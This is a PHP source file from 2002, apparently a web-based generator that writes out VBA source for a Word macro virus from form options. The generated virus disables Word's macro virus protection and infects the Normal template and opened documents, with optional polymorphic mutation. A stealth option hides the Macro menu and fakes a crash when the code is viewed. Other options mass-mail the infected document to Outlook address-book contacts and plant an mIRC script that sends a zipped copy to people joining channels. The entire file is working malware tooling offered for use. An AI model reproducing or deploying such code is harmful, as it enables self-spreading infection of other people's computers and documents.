<?php
//IMVM2.PHP by MI_pirat Copyright (C) 2002 [Red-Cell] inc.
//Variables init.
$virus = "";
$tab = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
$name = $HTTP_POST_VARS['name'];
$author = $HTTP_POST_VARS['author'];
$macro = $HTTP_POST_VARS['Auto'];
$text = $HTTP_POST_VARS['txt'];
$week = $HTTP_POST_VARS['week'];
$date = $HTTP_POST_VARS['date'];
$poly = $HTTP_POST_VARS['poly'];
$stealth = $HTTP_POST_VARS['stealth'];
$email = $HTTP_POST_VARS['email'];
$mirc = $HTTP_POST_VARS['mirc'];
$txt = $HTTP_POST_VARS['R1'][0];
$pay = $HTTP_POST_VARS['R2'][0];

//Start virus building
$virus = "'Module Name: $name <br>
'***Generated with: IMVM v2 by MI_pirat*** <br>
'Copy the code in a module with the same name as the virus: <br>
Sub $macro() <br>
'The $name Virus <br>
'by $author <br>
On Error Resume Next <br>
If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\", \"$name\") &lt;&gt; \"$name\" Then <br>
System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\", \"$name\")=\"$name\" <br>
Options.VirusProtection = (2 Xor 2) <br>
Options.SaveNormalPrompt = False <br>
With Options <br>
$tab        .AllowFastSave = True <br>
$tab        .BackgroundSave = True <br>
$tab        .CreateBackup = False <br>
$tab        .SavePropertiesPrompt = False <br>
$tab        .ConfirmConversions = False <br>
$tab        .UpdateLinksAtOpen = True <br>
$tab        .SendMailAttach = True <br>
End With <br>
Set myTemplate = NormalTemplate <br>
";

//If the virus is polymorphic
if (strcmp($poly,"poly")==0) //poly infection rutine
 {
$virus .= "Randomize (50) <br>
nume = Chr(Int((57 * Rnd) + 65)) + Chr(Int((57 * Rnd) + 65)) + Chr(Int((57 * Rnd) + 65)) <br>
ActiveDocument.VBProject.VBComponents(2).Name = nume <br>
StatusBar = nume <br>
nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines <br>
Set myTemplate = NormalTemplate <br>
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems <br>
For i = 1 To nr <br>
xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1) <br>
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) <br>
strn = xxx + \" '\"+ poly <br>
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn <br>
Next i <br>
Documents.Open filename:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, Revert:=False, Format:=wdOpenFormatAuto <br>
ActiveDocument.Save <br>
ActiveDocument.Close <br>
";
 }
else //if not, write a easy infection rutine
 {
$virus .= "Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=\"$name\", Object:=wdOrganizerObjectProjectItems <br>
Documents.Open filename:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=\"\", Format:=wdOpenFormatAuto <br>
ActiveDocument.Save <br>
ActiveDocument.Close <br>
";
 }

//If the virus is stealth
if (strcmp($stealth,"stealth")==0)
 {
$virus .= "CommandBars(\"Tools\").Controls(\"Macro\").Enabled = False <br>
";

 }

//If it has email spreading
if (strcmp($email,"email")==0)
 {
$virus .= "mmm = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) <br>
Set DOutlook = CreateObject(mmm + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110)) <br>
xxx = Chr(77) + Chr(65) + Chr(80) + Chr(73) <br>
Set DMName = DOutlook.GetNameSpace(xxx) <br>
Set mmm = DMName.AddressLists <br>
For ik = 1 To mmm.Count <br>
Set ABook = DMName.AddressLists(ik) <br>
xxx = 1 <br>
Set aa = ABook.AddressEntries <br>
Set BreakUmOffAS = DOutlook.CreateItem(0) <br>
For ij = 1 To aa.Count <br>
Pee = aa(xxx) <br>
BreakUmOffAS.Recipients.Add Pee <br>
xxx = xxx + 1 <br>
If xxx > 20 Then nr = aa.Count <br>
Next ij <br>
strip = ActiveDocument.FullName <br>
BreakUmOffAS.Subject = \"RE:\" <br>
BreakUmOffAS.Body = \"Read the doc. \" <br>
BreakUmOffAS.Attachments.Add strip <br>
BreakUmOffAS.Send <br>
Pee = \"\" <br>
Next ik <br>
";

 }

//mIRC script
if (strcmp($mirc,"mirc")==0)
 { //the PC must have WinZip installed in order the script to work ('cause it zips the .doc to avoid "AutoIgnore"
//set default by mIRC)
$virus .= "Randomize <br>
strip = ActiveDocument.FullName <br>
nam1 = \"C:\\\" + Chr(Int((25 * Rnd) + 65)) + \".zip\" <br>
scr = \"C:\\\" + Chr(Int((25 * Rnd) + 65)) + \".doc\" <br>
ActiveDocument.SaveAs scr <br>
ActiveDocument.SaveAs strip <br>
strip = Application.System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\" & _ <br>
\"\\CurrentVersion\\App Paths\\winzip32.exe\", \"\") <br>
Shell strip & \" -a -r \" & nam1 & Chr(32) & scr, vbHide <br>
'si acum face un script pt. mIRC <br>
'gaseste path-ul (cam ciudat nu?!) <br>
strip = System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC\\\", \"UninstallString\") <br>
strip = Mid(strip, 2, Len(strip) - 23) <br>
Open strip + \"script.ini\" For Output As #1 <br>
Print #1, \"[Script]\" <br>
Print #1, \"n0=ON 1:JOIN:#:{ /if ( \$nick == \$me ) { halt }\" <br>
Print #1, \"n1=/dcc send \$nick \" & Chr(34) & nam1 & Chr(34) <br>
Print #1, \"n2=}\" <br>
Close #1 <br>
";

 }

//The end of PC infection
$virus .="End If <br>";

//Payload (if any)
if (strcmp($txt,"texty")==0)
 {
 if (strcmp($pay,"weeky")==0)
  {
  $virus .= "dday = WeekDay(Date) <br>
  If dday = $week Then <br>
  MsgBox \"$text\" ,vbInformation <br>
  End If <br>
  ";
  }//weekday
 if (strcmp($pay,"datey")==0)
  {
  $virus .="dday = Day(Date) <br>
  If dday = $date Then <br>
  MsgBox \"$text\" ,vbInformation <br>
  End If <br>
  ";
  }//dom
 if (strcmp($pay,"allwy")==0)
  {
  $virus .="MsgBox \"$text\" ,vbInformation <br>
  ";
  }//Allways
 }//payload

//Start file infection
$virus .= "For Each aVar In ActiveDocument.Variables <br>
$tab    If aVar.Name = \"$name\" Then nm = aVar.Index <br>
Next aVar <br>
If (nm = 0) And (NormalTemplate.FullName &lt;&gt; ActiveDocument.FullName) Then <br>
ActiveDocument.Variables.Add Name:=\"$name\" <br>
ActiveDocument.Variables(\"$name\").Value = 666 <br>
Set myTemplate = NormalTemplate <br>
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=myTemplate.VBProject.VBComponents(2).Name, Object:=wdOrganizerObjectProjectItems <br>
ActiveDocument.Save <br>
End If <br>
";

//End of Sub
$virus .="End Sub <br>";

//If the virus is stealth
if (strcmp($stealth,"stealth")==0)
 {
$virus .= "Sub ViewVBCode() <br>
On Error Resume Next <br>
MsgBox \"WinWord Fatal error !\", vbCritical, \"Error at 76533654[eax]:7675{w32}\" <br>
Application.Quit (False) <br>
End Sub <br>
";
 }

//Show the source
echo "<title>The $name Virus Source Generated by IMVM v2.0</title>\n <body text=c0c0c0 bgcolor=000000>";
echo $virus;
?>
